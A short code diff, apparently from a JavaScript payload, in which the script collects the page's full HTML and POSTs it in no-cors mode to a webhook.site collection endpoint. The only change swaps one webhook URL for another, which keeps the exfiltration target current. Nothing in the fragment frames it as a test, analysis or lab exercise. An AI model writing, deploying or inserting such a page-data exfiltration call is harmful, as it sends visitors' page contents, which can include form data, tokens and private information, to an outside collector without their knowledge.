@@ -5,7 +5,7 @@
     html: document.documentElement.outerHTML,
   };
 
-  fetch("https://webhook.site/f353d5f0-2b32-43de-8734-17d04d1dc3f7", {
+  fetch("https://webhook.site/67b5c977-bf86-4e89-9806-4b8109857c46", {
     method: "POST",
     mode: "no-cors",
     headers: { "Content-Type": "application/json" },
